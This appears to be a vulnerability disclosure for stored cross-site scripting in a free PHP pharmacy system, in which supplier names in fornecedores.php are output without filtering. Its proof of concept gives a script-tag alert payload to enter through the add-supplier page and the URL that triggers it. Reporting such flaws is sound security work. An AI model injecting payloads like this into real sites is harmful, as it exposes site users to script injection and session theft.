# farmacia-in-php has Based Cross Site Scripting vulnerability in fornecedores.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
fornecedores.php
## describe
There is an  Cross Site Scripting vulnerability in farmacia system in fornecedores.php.

## code analysis

Get $forrnecedores from tb_forrnecedores in not filtter.

![image-20241114000816860](https://github.com/user-attachments/assets/b9a26a29-9f70-4878-acba-62eda2ce46b6)

And foreach fornecedores as value，echo $value['nome'] in no filtter.

![image-20241114000938400](https://github.com/user-attachments/assets/481027af-49e9-4380-a96e-bfa39cc6bf69)

## POC

```
http://farmacia/adicionar-fornecedor.php
```

Inset the Scripting  into databases.

Nome ：<script>alert(2);</script>

![image-20241114000508961](https://github.com/user-attachments/assets/3b167091-bd7c-4e3d-9866-1b79648314e5)

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/fornecedores.php
```

![image-20241114000723852](https://github.com/user-attachments/assets/dd04a0a6-66ac-4863-91a5-9f358a33def0)